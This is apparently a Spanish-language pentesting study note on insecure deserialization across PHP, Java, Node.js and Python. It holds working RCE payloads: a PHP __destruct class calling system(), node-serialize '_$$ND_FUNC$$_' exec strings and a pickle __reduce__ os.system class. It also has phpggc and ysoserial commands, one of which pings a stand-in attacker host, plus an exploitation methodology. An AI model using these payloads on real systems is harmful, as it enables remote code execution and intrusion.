
---
Tags: #deserializacion #objetos #web

---
# Definición

> **La deserialización** es el proceso por el cual una aplicación convierte datos serializados (strings, archivos, binarios) nuevamente a un objeto.  
> Si no se controla lo que se deserializa, puede permitir **inyección de código malicioso, ejecución remota de comandos o acceso a objetos internos**.

---

## 🧩 Lenguajes afectados comúnmente

|Lenguaje|Formato común de serialización|Funciones peligrosas|
|---|---|---|
|PHP|`serialize()` / `unserialize()`|`unserialize()`|
|Java|Objetos binarios (`.ser`)|`ObjectInputStream.readObject()`|
|Python|Pickle (`pickle.load()`)|`pickle.loads()`, `eval()`|
|Node.js|JSON, BSON, `node-serialize`|`serialize.unserialize()`|
|.NET|BinaryFormatter / ViewState|`Deserialize()`|

---

## 🛠️ ¿Cómo detectar una vulnerabilidad?

1. **Parámetros base64** o con formato serializado (`a:2:{...}`, `O:8:"stdClass":1:{...}`)
    
2. **Ficheros que aceptan objetos o estructuras complejas**
    
3. Funciones como `unserialize()`, `eval()`, `pickle.loads()` usadas sin validación
    
4. Uso de clases mágicas en PHP: `__wakeup()`, `__destruct()`, etc.
    
5. Observa respuestas inusuales tras manipular estructuras serializadas
    

---

## 🚩 Vectores de ataque más comunes

|Lenguaje|Vector|Ejemplo|
|---|---|---|
|PHP|`__destruct`, `__wakeup`, `__toString`|Ejecución de comandos al eliminar el objeto|
|Node.js|`eval` en propiedades manipuladas|Inyección JS que se ejecuta en el servidor|
|Java|Bibliotecas como CommonsCollections|Gadget chains para RCE|
|Python|Pickle que ejecuta `os.system()`|Ejecución al cargar el objeto|

---

## 🔧 Ejemplo real - PHP Deserialization (con RCE)

```php
<?php 
class Test {     
	public $cmd;     
	function __destruct() {         
		system($this->cmd);    
	 }
 }  
 $payload = serialize(new Test());
```

```bash
php -r 'class Test{public $cmd="id";function __destruct(){system($this->cmd);}} echo urlencode(serialize(new Test()));'
```

**Salida** (payload para inyectar):

`O:4:"Test":1:{s:3:"cmd";s:2:"id";}`

---

## 💣 Exploits y herramientas

|Herramienta|Uso|
|---|---|
|**PHPGGC**|Payload generator para PHP gadgets y clases vulnerables|
|**Ysoserial**|Generador de payloads Java vulnerables|
|**node-serialize exploit**|Prueba de gadgets en Node|
|**Burp Suite + Collaborator**|Para detectar ejecución remota (pingback)|
|**Ghidra/JD-GUI**|Análisis de clases Java para detectar gadgets|
|**SerialSniffer**|Sniffers para detectar objetos serializados en tránsito|

---

## ⚙️ Bypass y técnicas útiles

### Bypass de filtros en Node.js:
```js
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ls', function(error, stdout, stderr) { console.log(stdout) })}()"}
```

> En `node-serialize`, usar `_$$ND_FUNC$$_` permite ejecutar funciones.

---

### Pickle RCE Python

```python
import pickle, os  class RCE:     def __reduce__(self):         return (os.system, ('id',))  print(pickle.dumps(RCE()))
```

---

## 📘 Tabla resumen por lenguaje

|Lenguaje|Función vulnerable|Payload común|Herramienta|
|---|---|---|---|
|PHP|`unserialize()`|`O:8:"Class":1:{...}`|PHPGGC|
|Java|`readObject()`|`CommonsCollections1`|ysoserial|
|Node.js|`unserialize()`|`"_$$ND_FUNC$$_function..."`|node-serialize|
|Python|`pickle.loads()`|Clases maliciosas|Manual|

---

## 📌 Metodología general de explotación

1. **Identificación**
    
    - ¿Hay parámetros codificados en base64?
        
    - ¿Responde el servidor con error al alterar estos parámetros?
        
2. **Reconstrucción de estructura**
    
    - Usa `unserialize()` local para entender el formato
        
    - O decodifica JSON/base64
        
3. **Generación del payload**
    
    - PHP: `phpggc`
        
    - Java: `ysoserial`
        
    - Node: objeto JSON malicioso
        
    - Python: clase pickle maliciosa
        
4. **Inyección y ejecución**
    
    - Usa Burp, curl o exploit en Python
        
    - Detecta ejecución mediante DNS/logs/pingback
        

---

## 🧪 Payloads de ejemplo

```bash
# PHPGGC con Monolog 
phpggc Monolog/RCE1 system 'id' -b
```

```bash
# ysoserial con CommonsCollections 
java -jar ysoserial.jar CommonsCollections1 'ping attacker.com' | base64
```

```json
// node-serialize JSON 
{   "username": "_$$ND_FUNC$$_function(){require('child_process').exec('id')}" }
```

---

## 🧠 Consejos para encontrar y explotar

- Busca clases con métodos mágicos (`__wakeup`, `__destruct`, `__toString`)
    
- Inspecciona el código fuente o realiza fuzzing de parámetros
    
- Asegúrate de saber si el dato está base64 o en binario
    
- Haz un análisis estático del código si tienes acceso

---
# Referencias
- Portswigger:[Enlace](https://portswigger.net/web-security/deserialization/exploiting)